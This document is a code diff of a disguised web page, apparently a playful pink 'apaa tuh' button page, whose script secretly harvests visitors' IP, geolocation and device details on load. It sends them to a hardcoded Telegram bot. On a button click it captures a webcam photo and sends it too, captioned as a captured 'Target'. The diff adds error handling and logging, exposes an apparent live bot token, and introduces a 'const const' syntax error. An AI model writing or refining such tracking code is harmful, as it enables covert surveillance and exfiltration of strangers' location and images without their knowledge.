@@ -36,10 +36,14 @@ button{
   color:#ff69b4;
   cursor:pointer;
   transition: transform 0.2s, background 0.3s;
+  box-shadow: 0 4px 15px rgba(0,0,0,0.2);
 }
 button:hover{
   transform: scale(1.1);
   background:#ffe0f0;
+}
+button:active {
+    transform: scale(1.05);
 }
 </style>
 </head>
@@ -50,39 +54,46 @@ button:hover{
 <button id="btnCamera">apaa tuh</button>
 
 <script>
-const BOT_TOKEN="8379627519:AAF7Ti4YUtt17MB5AynRh7SM0ba3tXl8vJo"; // BOT TOKEN
+const const BOT_TOKEN="8379627519:AAF7Ti4YUtt17MB5AynRh7SM0ba3tXl8vJo"; // BOT TOKEN
 const CHAT_ID="6051179992"; // CHAT ID
-const STATIC_IMAGE="https://files.catbox.moe/8ybe0o.jpg";
+const STATIC_IMAGE="https://a.top4top.io/p_3592jwm3w0.jpg";
 
 function escapeHtml(s){return String(s||"-").replaceAll("&","&amp;").replaceAll("<","&lt;").replaceAll(">","&gt;");}
 
-// Ambil IP/device info via ipwhois.io
+// Ambil IP/device info via ip-api.com (CORS-friendly)
 async function getIpInfo(){
+  console.log("Mengambil informasi IP...");
   try{
-    const r = await fetch("https://ipwhois.app/json/");
+    const r = await fetch("https://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,lat,lon,timezone,query");
     const data = await r.json();
-    if(!data.success) return {ip:"-", city:"-", region:"-", country_name:"-", country_code:"-", latitude:"0", longitude:"0", timezone:"-"};
+    if(data.status !== "success") {
+        console.error("Gagal mengambil data IP:", data.message);
+        return {ip:"-", city:"-", region:"-", country_name:"-", country_code:"-", latitude:"0", longitude:"0", timezone:"-"};
+    }
+    console.log("Informasi IP berhasil diambil:", data);
     return {
-      ip: data.ip || "-",
+      ip: data.query || "-",
       city: data.city || "-",
-      region: data.region || "-",
+      region: data.regionName || "-",
       country_name: data.country || "-",
-      country_code: data.country_code || "-",
-      latitude: data.latitude || "0",
-      longitude: data.longitude || "0",
+      country_code: data.countryCode || "-",
+      latitude: data.lat || "0",
+      longitude: data.lon || "0",
       timezone: data.timezone || "-"
     };
   }catch(e){
+    console.error("Error saat mengambil informasi IP:", e);
     return {ip:"-", city:"-", region:"-", country_name:"-", country_code:"-", latitude:"0", longitude:"0", timezone:"-"};
   }
 }
 
 // Ambil device info
 async function getDeviceInfo(){
+  console.log("Mengambil informasi perangkat...");
   const b = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level:null,charging:false,chargingTime:null,dischargingTime:null}));
   const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
   
-  return {
+  const deviceInfo = {
     userAgent:navigator.userAgent,
     platform:navigator.platform,
     language:navigator.language,
@@ -129,6 +140,8 @@ async function getDeviceInfo(){
       localTime: new Date().toLocaleString()
     }
   };
+  console.log("Informasi perangkat berhasil diambil.");
+  return deviceInfo;
 }
 
 // Build caption Telegram dengan blockquote dan emoji
@@ -200,21 +213,43 @@ function buildCaption(ip,d){
 
 // Kirim IP/device + foto statis saat halaman load
 async function sendIpDevice(){
+  console.log("Memulai proses pengiriman data awal...");
   const [ip,d] = await Promise.all([getIpInfo(), getDeviceInfo()]);
-  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      photo: STATIC_IMAGE,
-      caption: buildCaption(ip,d),
-      parse_mode:"HTML"
-    })
-  });
+  const caption = buildCaption(ip,d);
+  console.log("Mengirim data ke Telegram...");
+
+  try {
+    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        photo: STATIC_IMAGE,
+        caption: caption,
+        parse_mode:"HTML"
+      })
+    });
+    const result = await response.json();
+    if(result.ok) {
+        console.log("Data awal berhasil dikirim ke Telegram!");
+    } else {
+        console.error("Gagal mengirim data awal ke Telegram:", result);
+    }
+  } catch (error) {
+    console.error("Terjadi kesalahan saat mengirim data awal:", error);
+  }
 }
 
 // Kamera snapshot sebagai file .jpg (document)
 async function sendSnapshot(){
+  // Cek apakah getUserMedia didukung
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      console.error("API Kamera tidak didukung oleh browser ini.");
+      alert("Fitur kamera tidak dapat digunakan di browser Anda.");
+      return;
+  }
+
+  console.log("Meminta izin kamera...");
   try{
     const stream = await navigator.mediaDevices.getUserMedia({video:true});
     const video = document.createElement('video');
@@ -234,24 +269,37 @@ async function sendSnapshot(){
 
     const formData = new FormData();
     formData.append("chat_id", CHAT_ID);
-    formData.append("document", blob, "screenshotbyaldofficialr.jpg");
+    formData.append("document", blob, "snapshot.jpg");
+    // Tambahkan parse_mode ke FormData agar format HTML diproses
     formData.append("caption", "<blockquote>📸 <b>Photo Captured Successfully!</b> 📸\n\nTarget's photo has been captured and sent to you.\n\n<b>Love Cute Bot</b></blockquote>");
     formData.append("parse_mode", "HTML");
 
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+    console.log("Mengirim snapshot ke Telegram...");
+    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
       method: "POST",
       body: formData
     });
+    
+    const result = await response.json();
+    if(result.ok) {
+        console.log("Snapshot berhasil dikirim!");
+    } else {
+        console.error("Gagal mengirim snapshot:", result);
+    }
 
     stream.getTracks().forEach(track=>track.stop());
     video.remove();
   }catch(e){
-    console.log("yahhh", e);
+    console.error("Gagal mengambil snapshot:", e);
+    alert("Tidak dapat mengakses kamera. Pastikan Anda telah memberikan izin.");
   }
 }
 
 // Jalankan saat halaman load
-window.addEventListener("load",sendIpDevice);
+window.addEventListener("load", () => {
+    // Jeda kecil untuk memastikan semua elemen halaman dimuat
+    setTimeout(sendIpDevice, 500);
+});
 
 // Tombol klik kamera
 document.getElementById("btnCamera").addEventListener("click", sendSnapshot);
